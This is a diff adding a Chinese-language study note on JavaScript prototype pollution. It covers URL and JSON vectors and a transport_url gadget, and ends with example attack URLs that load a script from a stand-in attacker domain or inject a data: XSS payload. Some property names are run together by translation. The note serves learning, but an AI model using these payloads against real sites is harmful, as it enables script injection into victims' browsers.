@@ -1,0 +1,37 @@
+#006
+FSAZ 2023-11-11
+如何利用原型污染
+通过 URL 进行原型污染
+查看一下这个个exp
+/?__proto__[evilProperty]=payload
+让我们看看如果这些键和值随后作为属性合并到现有对象中会发生什么
+targetObject.__proto__.evilProperty = 'payload'
+相当于---->调用传参的函数.的原型.传入值作为参数='exp'
+在实践中，注入调用的属性不太可能产生任何效果。但是，攻击者可以使用相同的技术，使用应用程序使用的属性或任何导入的库来污染原型。evilProperty
+通过JSON输入进行原型污染
+用户可控制的对象通常使用该方法从 JSON 字符串派生。有趣的是，它还将 JSON 对象中的任何键视为任意字符串，包括类似 .这为原型污染提供了另一个潜在的载体
+假设攻击者通过 Web 消息注入以下恶意 JSON:
+{
+    "__proto__": {
+        "evilProperty": "payload"
+    }
+}
+如果通过该方法将其转换为 JavaScript 对象，则生成的对象实际上将具有一个带有键的属性
+const objectLiteral = {__proto__: {evilProperty: 'payload'}};
+const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+objectLiteral.hasOwnProperty('__proto__');     // false
+objectFromJson.hasOwnProperty('__proto__');    // true
+hasOwnProperty(propertyName)方法 是用来检测属性是否为对象的自有属性，如果是，返回true，否者false
+所以这证明了这样会导致原型污染
+可能的利用
+let transport_url = config.transport_url || defaults.transport_url;
+现在想象一下，库代码使用它来添加对页面的脚本引用：transport_url
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+如果网站的开发人员尚未在其对象上设置属性，则这是一个潜在的小工具。如果攻击者能够用自己的属性污染全局属性，则该属性将由对象继承，因此，将此脚本设置为攻击者选择的域。transport_urlconfigObject.prototypetransport_urlconfigsrc
+例如，如果原型可以通过查询参数受到污染，则攻击者只需诱使受害者访问特制的 URL，即可使其浏览器从攻击者控制的域导入恶意 JavaScript 文件：
+https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+通过提供 URL，攻击者还可以直接在查询字符串中嵌入 XSS 有效负载，如下所示：data:
+https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+请注意，此示例中的尾随只是注释掉硬编码的后缀。///example.js
